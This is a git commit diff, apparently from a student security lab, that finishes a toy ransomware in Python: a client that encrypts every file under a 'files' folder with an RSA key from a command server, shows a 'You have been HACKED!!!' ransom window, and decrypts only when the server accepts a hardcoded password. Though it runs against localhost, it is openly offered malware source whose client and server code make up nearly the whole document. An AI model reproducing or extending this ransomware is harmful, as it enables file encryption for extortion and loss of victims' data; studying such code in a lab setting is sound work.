1aa7d94bb990c191ec8c48c619a79682484c4bfc
wille <wilud321@student.liu.se>
2020-10-12 11:30:22 +0200

    we finnish

--- lab4/client.py
+++ lab4/client.py
@@ -5,6 +5,20 @@ import os
 import tkinter as tk
 import threading
 import select
+import queue
+import sys
+from PIL import Image, ImageTk
+
+HOST = '127.0.0.1'
+PORT = 1337
+
+FIRST_RUN = True
+
+ENCRYPT_MESSAGE = 0
+WRONG_PASSWORD_MESSAGE = 1
+DECRYPT_MESSAGE = 2
+
+shared_queue = queue.Queue()
 
 def encrypt(key, input_file):
     encrypted_data = b''
@@ -30,41 +44,50 @@ def decrypt(key, input_file):
     return decrypted_data
 
 def gui():
-
     window = tk.Tk()
 
-    label_pass = tk.Label(master=window, text="Password:")
+    canvas = tk.Canvas(window, width=64, bg="red", height=80)      
+    canvas.pack()      
+    img = tk.PhotoImage(file="lock.png")   
+
+    canvas.create_image(0, 10, anchor=tk.NW, image=img) 
+    label_pass = tk.Label(master=window, bg="red", text="You have been HACKED!!!")
+    label_pass.pack()
+
+    label_pass = tk.Label(master=window, bg="red", text="Password:")
     label_pass.pack()
     ent_pass = tk.Entry(master=window, width=50)
     ent_pass.pack()
 
-    def test():
+    def check():
         print('txt:', ent_pass.get())
+        shared_queue.put(ent_pass.get())
         ent_pass.delete(0, tk.END)
 
-    btn_submit = tk.Button(master=window, text="Submit", command=test)
+    btn_submit = tk.Button(master=window, text="Submit", command=check)
     btn_submit.pack(side=tk.RIGHT, padx=10, ipadx=10)
 
+    window.configure(background='red', highlightbackground="red")
+    window.winfo_toplevel().title('MY RANSOMWARE')
+    window.geometry("600x200")
     window.mainloop()
 
-
 def connection(server_socket):
-    
     inputs = [server_socket] # read
     outputs = [server_socket] # write
 
-    i = 0
+    if FIRST_RUN:
+        server_socket.sendall(bytes([0]))
+
     while inputs:        
         readable, writable, _ = select.select(inputs, outputs, [])
 
         for conn in readable:
-            message_type = server_socket.recv(64)
-            message_type = message_type.decode('utf-8')
-            print('msg: ', message_type)
-
-            if message_type == 'ENCRYPT':
-                public_key = conn.recv(1024)
-                public_key = RSA.importKey(public_key)
+            msg = conn.recv(4096)
+            msg_type = int(msg[0])
+            
+            if msg_type == ENCRYPT_MESSAGE:
+                public_key = RSA.importKey(msg[1:])
 
                 for root, _, files in os.walk('files'):
                     for filename in files:
@@ -77,106 +100,38 @@ def connection(server_socket):
                         output_file = open(root + "/" + filename, 'wb')
                         output_file.write(data)
                         output_file.close()
-                        print('asdf')
+            elif msg_type == WRONG_PASSWORD_MESSAGE:
+                print('wrong password')
+            elif msg_type == DECRYPT_MESSAGE:
+                private_key = RSA.importKey(msg[1:])
+                
+                for root, _, files in os.walk('files'):
+                    for filename in files:
+                        print('DECRYPT FILE:', filename)
+                        
+                        input_file = open(root + "/" + filename, 'rb')
+                        data = decrypt(private_key, input_file)
+                        input_file.close()
 
-            elif message_type == 'WRONG_PASSWORD':
-                pass
-            elif message_type == 'CORRECT_PASSWORD':
-                pass
-            else:
-                print('message_type unknown')
-
-            print('the end')
+                        output_file = open(root + "/" + filename, 'wb')
+                        output_file.write(data)
+                        output_file.close()
+                os._exit(0)                    
 
         for conn in writable:
-            #print('halllååå?!??!?!')
-
-        
-
-
-
-
-# def connection(server_socket):
-#     # HOST = '127.0.0.1'
-#     # PORT = 1337
-    
-#     # server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
-#     # server_socket.connect((HOST, PORT))
-    
-#     while True:
-#         message_type = server_socket.recv(64)
-#         message_type = message_type.decode('utf-8')
-#         print('msg: ', message_type)
-
-#         if message_type == 'ENCRYPT':
-#             public_key = server_socket.recv(1024)
-#             public_key = RSA.importKey(public_key)
-            
-#             for root, _, files in os.walk('files'):
-#                 for filename in files:
-#                     print('ENCRYPT FILE:', filename)
-                    
-#                     input_file = open(root + "/" + filename, 'rb')
-#                     data = encrypt(public_key, input_file)
-#                     input_file.close()
-
-#                     output_file = open(root + "/" + filename, 'wb')
-#                     output_file.write(data)
-#                     output_file.close()
-#         elif message_type == 'WRONG_PASSWORD':
-#             pass
-#         elif message_type == 'CORRECT_PASSWORD':
-#             pass
-#         else:
-#             print('message_type unknown')
-
-
-
+            try:
+                password = shared_queue.get_nowait()
+            except queue.Empty:
+                pass
+            else:  
+                conn.sendall(bytes([1]) + password.encode('utf-8'))
 
 if __name__ == '__main__':
-    HOST = '127.0.0.1'
-    PORT = 1337
-    
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
-    server_socket.connect((HOST, PORT))
-    
-    
+    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+    my_socket.connect((HOST, PORT))
+
     gui_thread = threading.Thread(target=gui, args=())
-    connection_thread = threading.Thread(target=connection, args=(server_socket,))
-    
+    connection_thread = threading.Thread(target=connection, args=(my_socket,))
+
     gui_thread.start()
     connection_thread.start()
-
-    
-    
-    
-       
-       
-
-
-        
-        #key = server_socket.recv(4069)
-
-
-    
-    # f = open('private_key.pem', 'rb')
-    # #f = open('public_key.pem', 'rb')
-    # f = f.read()
-    # imported_key = RSA.importKey(f)
-
-    # for root, dirs, files in os.walk('files'):
-    #     print(root, dirs, files) 
-
-    #     for filename in files:
-    #         print(filename)
-            
-    #         input_file = open(root + "/" + filename, 'rb')
-
-    #         #data = encrypt(imported_key, input_file)
-    #         data = decrypt(imported_key, input_file)
-            
-    #         input_file.close()
-
-    #         output_file = open(root + "/" + filename, 'wb')
-    #         output_file.write(data)
-    #         output_file.close()
--- lab4/server.py
+++ lab4/server.py
@@ -1,8 +1,3 @@
-# server
-# connection with client
-# store public and private key 
-# store a super secret passowrd to get private key
-
 import socket
 import threading
 import keys
@@ -12,41 +7,37 @@ import random
 HOST = '127.0.0.1'
 PORT = 1337
 
-
+PASSWORD = 'hej'
 
 def handler(client_socket):
-    
     while True:
-        msg = 'ENCRYPT'
-        client_socket.sendall(msg.encode('utf-8'))
+        msg = client_socket.recv(4096)
+        msg_type = int(msg[0])
         
-        public_key, private_key = keys.generate_keys()
-        payload = bytes(public_key.export_key('PEM'))
-        client_socket.sendall(payload)
+        # client clicks on file which triggers encryption
+        if msg_type == 0:
+            public_key, private_key = keys.generate_keys()
+            
+            f = open('private_key.pem', 'wb')
+            f.write(private_key.export_key('PEM'))
+            f.close()
 
-        time.sleep(30)
+            f = open('public_key.pem', 'wb')
+            f.write(public_key.export_key('PEM'))
+            f.close()
+            
+            payload = bytes([0]) + bytes(public_key.export_key('PEM'))
+            client_socket.sendall(payload)
 
-        # msg = '____ENCRYPT'
-        # client_socket.sendall(msg.encode('utf-8'))
-        # time.sleep(5)
-    
+        # check supersecret password
+        elif msg_type == 1:
+            if PASSWORD == msg[1:].decode('utf-8'):
+                f = open('private_key.pem', 'rb')
+                client_socket.sendall(bytes([2]) + f.read())
+                f.close()
+            else:
+                client_socket.sendall(bytes([1]))
 
-
-    # f = open('private_key.pem', 'wb')
-    # f.write(private_key.export_key('PEM'))
-    # f.close()
-
-    # f = open('public_key.pem', 'wb')
-    # f.write(public_key.export_key('PEM'))
-    # f.close()
-
-    # # payload = bytes(public_key.export_key('PEM'))
-    # # client_socket.sendall(payload)
-    
-
-
-
-# main
 if __name__ == '__main__':
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((HOST, PORT))
@@ -54,6 +45,5 @@ if __name__ == '__main__':
 
     while True:
         conn, addr = server.accept()
-        print('NEW CONNECTION:', addr)
         new_thread = threading.Thread(target=handler, args=(conn,))
         new_thread.start()
